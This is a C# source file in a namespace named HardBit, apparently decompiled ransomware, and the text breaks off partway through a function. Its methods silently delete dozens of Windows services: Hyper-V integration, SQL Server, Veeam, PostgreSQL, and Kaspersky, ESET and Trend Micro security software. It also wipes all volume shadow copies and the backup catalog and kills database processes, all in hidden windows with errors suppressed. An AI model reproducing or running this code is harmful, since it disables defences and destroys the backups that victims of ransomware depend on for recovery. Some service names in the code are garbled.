﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Threading;


namespace HardBit
{
  public class Class03
  {
    public static void Disable_1vmickvpexchange()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmickvpexchange")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_2vmicguestinterface()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmicguestinterface")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_3vmicshutdown()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmicshutdown")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_4vmicheartbeat()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmicheartbeat")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_5vmicrdv()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmicrdv")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_6storflt()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete storflt")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_7vmictimesyn()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmictimesync")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_8vmicvss()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete vmicvss")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_9MSSQLFDLauncher()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQLFDLauncher")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_10MSSQLSERVER()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQLSERVER")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_11SERVERAGENT()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQL SERVERAGENT")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_12SQLBrowser()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLBrowser")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_13SQLTELEMETRY()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLTELEMETRY")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_14MsDtsServer130()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MsDtsServer130")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_15SSISTELEMETRY130()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SSISTELEMETRY130")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_16SQLWriter()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLWriter")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_17MSSQLVEEAMSQL2012()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQL$VEEAMSQL2012")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_18SQLAgentVEEAMSQL2012()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLAgent$VEEAMSQL2012")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_19MSSQL()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQL")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_20SQLAgent()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLAgent")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_21MSSQLServerADHelper100()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQLServerADHelper100")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_22MSSQLServerOLAPService()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc MSSQLServerOLAPService")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_23MsDtsServer100()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MsDtsServer100")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_23ReportServer()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete ReportServer")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_24SQLTELEMETRYHL()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLTELEMETRY$HL")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_25TMBMServer()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TMBMServer")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_26MSSQLPROGID()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQL$PROGID")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_27MSSQLWOLTERSKLUWER()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQL $WOLTERSKLUWER")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_28SQLAgentPROGID()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLAgent$PROGID")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_29SQLAgentWOLTERSKLUWER()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLAgent$WOLTERSKLUWER")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_30MSSQLFDLauncherOPTIMA()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSSQLFDLauncher$OPTIMA")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_31MSSQLOPTIMA()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete MSS QL$OPTIMA")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_32SQLAgentOPTIMA()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete SQLAgent$OPTIMA")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_33ReportServerOPTIMA()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete ReportServer$OPTIMA")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_34msftesqlSQLEXPRESS()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete msftesql$SQLEXPRESS")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_35postgresql_x64_9_4()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete postgresql-x64-9,4")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_36WRSVC()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete WRSVC")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_37ekrn()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete ekrn")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_38klim6()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klim6")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_39AVP18_0_0()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete AVP18,0.0")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_40KLIF()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete KLIF")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_41klpd()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klpd")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_42klflt()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klflt")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_43klbackupdisk()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klbackupdisk")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_44klbackupflt()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klbackupflt")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_45klkbdflt()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klkbdflt")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_46klmouflt()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klmouflt")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_47klhk()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete klhk")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_48KSDE()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete KSDE۱,۰.۰")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_49kltap()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete kltap")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_50TmFilter()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TmFilter")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_51TMLWCSService()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TMLWCSService")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_52tmusa()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete tmusa")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_53TmPreFilter()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TmPreFilter")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_54TMSmartRelayService()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TMSmartRelayService")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_55TMiCRCScanService()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TMiCRC ScanService")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_56VSApiNt()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete VSApiNt")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_57TmCCSF()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete TmCCSF")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_58tmlisten()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete tmlisten")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_59ntrtscan()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete ntrtscan")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_60ofcservice()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("cmd.exe", "/c sc delete ofcservice")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_61Shadow_Copiese()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("vssadmin", "delete shadows /all /quiet")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void Disable_62catalog()
    {
      try
      {
        ProcessStartInfo processStartInfo = new ProcessStartInfo("vssadmin", "delete catalog -quiet")
        {
          RedirectStandardOutput = true,
          UseShellExecute = false,
          CreateNoWindow = true,
          WindowStyle = ProcessWindowStyle.Hidden
        };
        new Process() { StartInfo = processStartInfo }.Start();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        ProjectData.ClearProjectError();
      }
    }

    public static void kill_processes2()
    {
      try
      {
        Process[] processesByName1 = Process.GetProcessesByName("vss");
        int index1 = 0;
        while (index1 < processesByName1.Length)
        {
          processesByName1[index1].Kill();
          checked { index1 += 1; }
        }
        Process[] processesByName2 = Process.GetProcessesByName("oracle");
        int index2 = 0;
        while (index2 < processesByName2.Length)
        {
          processesByName2[index2].Kill();
          checked { index2 += 1; }
        }
        Process[] processesByName3 = Process.GetProcessesByName("ocssd");
        int index3 = 0;
        while (index3 < processesByName3.Length)
        {
          processesByName3[index3].Kill();
          checked { index3 += 1; }
        }
        Process[] processesByName4 = Process.GetProcessesByName("dbsnmp");
        int index4 = 0;
        while (index4 < processesByName4.Length)
        {
          processesByName4[index4].Kill();
